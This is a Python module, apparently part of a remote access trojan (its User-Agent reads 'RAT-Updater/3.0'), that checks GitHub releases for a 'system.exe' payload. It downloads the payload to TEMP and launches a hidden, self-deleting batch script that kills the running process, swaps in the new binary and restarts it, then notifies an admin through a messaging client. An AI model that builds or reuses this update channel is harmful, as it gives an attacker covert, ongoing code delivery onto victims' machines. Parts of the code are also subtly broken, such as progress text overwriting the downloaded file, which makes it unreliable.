# auto_updater.py - SELECTIVE VERSION UPDATE (Production Ready)
import asyncio
import os
import sys
import json
import urllib.request
import urllib.parse
import logging
import subprocess
import shutil
from pathlib import Path
from datetime import datetime

from config import GITHUB_USERNAME, GITHUB_REPO, CURRENT_VERSION, ADMIN_ID

logger = logging.getLogger(__name__)

CHECK_INTERVAL = 3600 * 6  # 6 hours

class AutoUpdater:
    def __init__(self, client):
        self.client = client
        self.is_running = False
        self.last_check = None
        self.available_versions = []  # List of all available releases
    
    def check_github_configured(self):
        """Check if GitHub settings are valid"""
        if GITHUB_USERNAME == "YOUR_USERNAME" or GITHUB_REPO == "YOUR_REPO":
            logger.warning("GitHub not configured")
            return False
        return True
    
    async def fetch_all_releases(self):
        """
        Fetch ALL releases from GitHub API
        Returns: List of release dicts with version info
        """
        if not self.check_github_configured():
            return None
        
        try:
            # API endpoint for all releases
            api_url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/releases"
            
            headers = {
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'RAT-Updater/3.0'
            }
            
            # Add token if available (for private repos)
            try:
                from config import GITHUB_TOKEN
                if hasattr(config, 'GITHUB_TOKEN') and GITHUB_TOKEN and GITHUB_TOKEN != "YOUR_TOKEN":
                    headers['Authorization'] = f'token {GITHUB_TOKEN}'
                    logger.info("Using GitHub token for private repo")
            except:
                pass
            
            # Async fetch
            loop = asyncio.get_event_loop()
            
            def fetch():
                request = urllib.request.Request(api_url, headers=headers)
                response = urllib.request.urlopen(request, timeout=15)
                return json.loads(response.read().decode())
            
            releases_data = await loop.run_in_executor(None, fetch)
            
            # Parse releases
            releases = []
            for release in releases_data:
                version = release.get('tag_name', '').replace('v', '')
                if not version:
                    continue
                
                # Find system.exe asset specifically (not any .exe)
                download_url = None
                for asset in release.get('assets', []):
                    asset_name = asset['name'].lower()
                    # Faqat system.exe yuklanadi
                    if asset_name == 'system.exe':
                        download_url = asset['browser_download_url']
                        break
                    # Yoki versiyali nom: system_v3.0.3.exe
                    elif asset_name.startswith('system') and asset_name.endswith('.exe'):
                        download_url = asset['browser_download_url']
                        break
                
                if not download_url:
                    continue  # Skip releases without system.exe
                
                releases.append({
                    'version': version,
                    'tag': release.get('tag_name'),
                    'name': release.get('name', version),
                    'published_at': release.get('published_at', ''),
                    'body': release.get('body', 'No description')[:300],
                    'download_url': download_url,
                    'html_url': release.get('html_url', ''),
                    'prerelease': release.get('prerelease', False),
                })
            
            self.available_versions = releases
            logger.info(f"Found {len(releases)} releases")
            return releases
            
        except urllib.error.HTTPError as e:
            if e.code == 404:
                logger.error("GitHub repository not found (404)")
            elif e.code == 403:
                logger.error("GitHub API rate limit or auth failed (403)")
            else:
                logger.error(f"HTTP error: {e.code}")
            return None
        except Exception as e:
            logger.error(f"Fetch releases error: {e}")
            return None
    
    async def check_for_updates(self):
        """
        Check if there's a newer version than current
        Returns: True if update available, False otherwise
        """
        try:
            releases = await self.fetch_all_releases()
            if not releases:
                return False
            
            # To'g'ri versiya taqqoslash (semantic versioning)
            def parse_version(v):
                """Convert version string to comparable tuple: '3.0.2' -> (3, 0, 2)"""
                try:
                    parts = v.replace('v', '').split('.')
                    return tuple(int(p) for p in parts if p.isdigit())
                except:
                    return (0, 0, 0)
            
            current = parse_version(CURRENT_VERSION)
            
            # Faqat yangi versiyalarni qoldirish
            newer_releases = []
            for release in releases:
                release_ver = parse_version(release['version'])
                if release_ver > current:
                    newer_releases.append(release)
            
            # Yangi versiyalar bilan yangilash
            self.available_versions = newer_releases
            
            if newer_releases:
                return True
            
            return False
        except Exception as e:
            logger.error(f"Update check error: {e}")
            return False
    
    async def download_version(self, version_info, progress_callback=None):
        """
        Download a specific version
        
        Args:
            version_info: Dict with 'download_url' and 'version'
            progress_callback: Optional async function(percent) for progress updates
        
        Returns:
            Path to downloaded file or None
        """
        try:
            download_url = version_info['download_url']
            version = version_info['version']
            
            temp_dir = Path(os.environ.get("TEMP", ""))
            temp_file = temp_dir / f"update_v{version}.exe"
            
            logger.info(f"Downloading {download_url} to {temp_file}")
            
            # Async download with progress
            loop = asyncio.get_event_loop()
            
            def download():
                request = urllib.request.Request(download_url)
                
                # Add auth if needed
                try:
                    from config import GITHUB_TOKEN
                    if GITHUB_TOKEN and GITHUB_TOKEN != "YOUR_TOKEN":
                        request.add_header('Authorization', f'token {GITHUB_TOKEN}')
                except:
                    pass
                
                response = urllib.request.urlopen(request, timeout=300)
                total_size = int(response.headers.get('Content-Length', 0))
                
                with open(temp_file, 'wb') as f:
                    downloaded = 0
                    chunk_size = 8192
                    
                    while True:
                        chunk = response.read(chunk_size)
                        if not chunk:
                            break
                        
                        f.write(chunk)
                        downloaded += len(chunk)
                        
                        # Progress callback (can't be async in executor)
                        if total_size > 0:
                            percent = (downloaded / total_size) * 100
                            # Store progress for async callback
                            temp_file.write_text(f"{percent:.1f}", encoding='utf-8')
                
                return temp_file
            
            result = await loop.run_in_executor(None, download)
            
            if result and result.exists():
                logger.info(f"Download complete: {result}")
                return result
            else:
                logger.error("Download failed - file not found")
                return None
                
        except Exception as e:
            logger.error(f"Download error: {e}")
            return None
    
    async def install_update(self, exe_path, version):
        """
        Self-replacement update installer
        
        Creates a batch script that:
        1. Waits for current process to exit
        2. Replaces old .exe with new one
        3. Restarts the application
        
        Args:
            exe_path: Path to new .exe file
            version: Version string for logging
        """
        try:
            # Get current exe path
            if getattr(sys, 'frozen', False):
                current_exe = Path(sys.executable)
            else:
                logger.error("Update only works in .exe mode")
                return False
            
            logger.info(f"Installing update: {exe_path} -> {current_exe}")
            
            # Create backup
            backup_file = current_exe.with_suffix('.exe.backup')
            try:
                shutil.copy2(current_exe, backup_file)
                logger.info(f"Backup created: {backup_file}")
            except Exception as e:
                logger.warning(f"Backup failed: {e}")
            
            # Create update script
            temp_dir = Path(os.environ.get("TEMP", ""))
            update_script = temp_dir / "update_installer.bat"
            
            script_content = f'''@echo off
REM Auto-generated update script
echo Waiting for application to close...
timeout /t 3 /nobreak >nul

REM Kill process if still running
taskkill /F /IM "{current_exe.name}" >nul 2>&1
timeout /t 1 /nobreak >nul

REM Replace exe
echo Installing update v{version}...
copy /Y "{exe_path}" "{current_exe}" >nul 2>&1

REM Verify
if not exist "{current_exe}" (
    echo Update failed! Restoring backup...
    copy /Y "{backup_file}" "{current_exe}" >nul 2>&1
    goto cleanup
)

REM Success - delete temp and backup
echo Update successful!
del /F /Q "{exe_path}" >nul 2>&1
timeout /t 1 /nobreak >nul

REM Start new version
echo Starting application...
start "" "{current_exe}"

:cleanup
REM Delete backup after delay
timeout /t 5 /nobreak >nul
del /F /Q "{backup_file}" >nul 2>&1

REM Self-delete
del /F /Q "%~f0" >nul 2>&1
'''
            
            update_script.write_text(script_content, encoding='utf-8')
            logger.info(f"Update script created: {update_script}")
            
            # Launch update script
            creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            
            subprocess.Popen(
                ["cmd.exe", "/c", str(update_script)],
                creationflags=creationflags,
                shell=False,
                cwd=str(temp_dir)
            )
            
            logger.info("Update script launched - exiting application")
            
            # Give script time to start
            await asyncio.sleep(1)
            
            # Exit current process
            sys.exit(0)
            
        except Exception as e:
            logger.error(f"Install update error: {e}")
            
            # Try to restore backup
            if 'backup_file' in locals() and backup_file.exists():
                try:
                    shutil.copy2(backup_file, current_exe)
                    backup_file.unlink()
                    logger.info("Backup restored after failure")
                except Exception as be:
                    logger.error(f"Backup restore failed: {be}")
            
            return False
    
    async def notify_admin(self, message):
        """Send notification to admin"""
        try:
            await self.client.send_message(ADMIN_ID, message, silent=True)
        except Exception as e:
            logger.error(f"Notify admin error: {e}")
    
    async def auto_update_loop(self):
        """
        Background task that periodically checks for updates
        Notifies admin when new version is available
        """
        self.is_running = True
        logger.info("Auto-updater loop started")
        
        # Initial delay
        await asyncio.sleep(60)
        
        while self.is_running:
            try:
                logger.info("Checking for updates...")
                self.last_check = datetime.now()
                
                has_update = await self.check_for_updates()
                
                if has_update and self.available_versions:
                    latest = self.available_versions[0]  # First is newest
                    
                    message = (
                        f"🆕 **New Version Available!**\n\n"
                        f"📦 Current: `v{CURRENT_VERSION}`\n"
                        f"🎉 Latest: `v{latest['version']}`\n\n"
                        f"📝 {latest['body']}\n\n"
                        f"💡 Use /start > 🔄 Update to install"
                    )
                    
                    await self.notify_admin(message)
                    logger.info(f"Admin notified about v{latest['version']}")
                else:
                    logger.info("No updates available")
                
                # Wait before next check
                await asyncio.sleep(CHECK_INTERVAL)
                
            except asyncio.CancelledError:
                logger.info("Auto-updater cancelled")
                break
            except Exception as e:
                logger.error(f"Auto-updater loop error: {e}")
                await asyncio.sleep(300)  # 5 min on error
        
        self.is_running = False
        logger.info("Auto-updater loop stopped")
    
    def start(self):
        """Start background update checker"""
        if not self.is_running:
            asyncio.create_task(self.auto_update_loop())
            logger.info("Auto-updater task created")
    
    def stop(self):
        """Stop background checker"""
        self.is_running = False
        logger.info("Auto-updater stop requested")

# ==================== GLOBAL INSTANCE ====================
_auto_updater = None

def start_auto_updater(client):
    """Initialize and start auto-updater service"""
    global _auto_updater
    
    if _auto_updater is None:
        _auto_updater = AutoUpdater(client)
        _auto_updater.start()
        logger.info("Auto-updater service started")
    
    return _auto_updater

def stop_auto_updater():
    """Stop auto-updater service"""
    global _auto_updater
    
    if _auto_updater is not None:
        _auto_updater.stop()
        _auto_updater = None
        logger.info("Auto-updater service stopped")

def get_auto_updater():
    """Get current auto-updater instance"""
    return _auto_updater